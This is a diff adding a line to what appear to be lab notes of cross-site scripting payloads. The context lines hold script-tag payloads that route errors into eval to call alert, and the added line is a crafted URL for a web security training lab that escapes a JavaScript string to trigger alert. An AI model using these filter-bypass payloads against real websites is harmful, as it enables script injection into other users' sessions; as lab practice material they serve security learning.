@@ -367,6 +367,8 @@ Second Payload: <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[
 
 Third Payload: <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
 
+Payload: https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
 
 
 
